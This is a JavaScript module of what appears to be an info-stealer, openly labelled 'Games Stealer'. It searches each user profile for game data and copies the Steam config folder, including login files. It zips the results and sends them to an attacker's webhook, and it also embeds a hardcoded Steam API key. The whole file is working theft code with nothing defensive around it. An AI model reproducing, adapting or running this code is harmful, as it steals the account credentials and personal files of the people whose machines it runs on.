const os = require('os');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const gamesPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const games = async (webhookUrl) => {
    const users = await hardware.getUsers();
    let anyGameFound = false;

    for (const user of users) {
        const gamesTempDir = path.join(os.tmpdir(), `games-temp`);
        let foundGames = '';

        for (const [gameName, gamePaths] of Object.entries(gamesPaths.getGames())) {
            const destGames = path.join(gamesTempDir, user.split(path.sep)[2], gameName);
            let gameDataFound = false;

            for (const [name, relativePath] of Object.entries(gamePaths)) {
                const gamePath = path.join(user, relativePath);

                try {
                    if (fs.existsSync(gamePath)) {

                        gameDataFound = true;

                        if (!fs.existsSync(destGames)) {
                            fs.mkdirSync(destGames, { recursive: true });
                        }

                        if (path.extname(gamePath)) {
                            const gameDestPath = path.join(destGames, name, path.basename(gamePath));
                            if (!fs.existsSync(path.join(destGames, name))) {
                                fs.mkdirSync(path.join(destGames, name), { recursive: true });
                            }
                            await fileutil.copy(gamePath, gameDestPath);
                        } else {
                            await fileutil.copy(gamePath, path.join(destGames, name));
                        }

                        if (!foundGames.includes(gameName)) {
                            foundGames += `\n✅ ${gameName}`;
                            anyGameFound = true;
                        }
                    }
                } catch (error) {
                    console.error(error);
                }
            }

            if (!gameDataFound) {
                fs.rmSync(destGames, { recursive: true, force: true });
            }
        }

        if (!foundGames) {
            fs.rmSync(gamesTempDir, { recursive: true, force: true });
            continue;
        }

        const gamesTempZip = path.join(os.tmpdir(), 'games.zip');
        try {
            await fileutil.zipDirectory({
                inputDir: gamesTempDir,
                outputZip: gamesTempZip
            })

            await requests.webhook(webhookUrl, {
                embeds: [{
                    title: `Games Stealer - ${user.split(path.sep)[2]}`,
                    description: '```' + foundGames + '```',
                }],
            }, [gamesTempZip]);

            const WishTempDir = fileutil.WishTempDir('games');
            await fileutil.copy(gamesTempDir, WishTempDir);

            [gamesTempDir, gamesTempZip].forEach(async dir => {
                await fileutil.removeDir(dir);
            });
        } catch (error) {
            console.error(error);
        }
    }
};

const steam = async (webhookUrl) => {
    const steamTempDir = path.join(os.tmpdir(), 'steam-temp');
    const steamPath = path.join('C:', 'Program Files (x86)', 'Steam', 'config');

    if (!fs.existsSync(steamPath) || !fs.statSync(steamPath).isDirectory()) return;

    const readConfig = (filePath) => {
        const vdfContent = fs.readFileSync(filePath, 'utf-8');
        const lines = vdfContent.split('\n');
        const result = [];
        const idRegex = /7656[0-9]{13}/gi;

        for (const line of lines) {
            const matches = line.match(idRegex);
            if (matches) result.push(...matches);
        }

        return result;
    };

    const config = path.join(steamPath, "config.vdf");
    if (fs.existsSync(config)) {
        const loginusers = path.join(steamPath, "loginusers.vdf");
        const userID = readConfig(loginusers);

        try {
            const response = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${userID}`);
            const accountInfo = response.data?.accountInfo?.response?.players || {};

            await fileutil.copy(steamPath, steamTempDir);
            const steamTempZip = path.join(os.tmpdir(), 'steam.zip');

            await fileutil.zipDirectory({
                inputDir: steamTempDir,
                outputZip: steamTempZip
            });

            await requests.webhook(webhookUrl, {
                embeds: [{
                    ...accountInfo && accountInfo.avatar ? { thumbnail: { url: accountInfo.avatar } } : null,
                    title: `Steam ${accountInfo && accountInfo.personaname ? `${accountInfo.personaname} | Created At <t:${accountInfo.timecreated}>` : ''}`,
                    description: '```' + '✅✅✅' + '```',
                }],
            }, [steamTempZip]);

            const WishTempDir = fileutil.WishTempDir('games');
            await fileutil.copy(steamTempDir, WishTempDir);

            [steamTempDir, steamTempZip].forEach(dir => {
                fs.rmSync(dir, { recursive: true, force: true });
            });
        } catch (error) {
            console.error(error);
        }
    }
};

module.exports = async (webhookUrl) => {
    await games(webhookUrl);
    await steam(webhookUrl);
}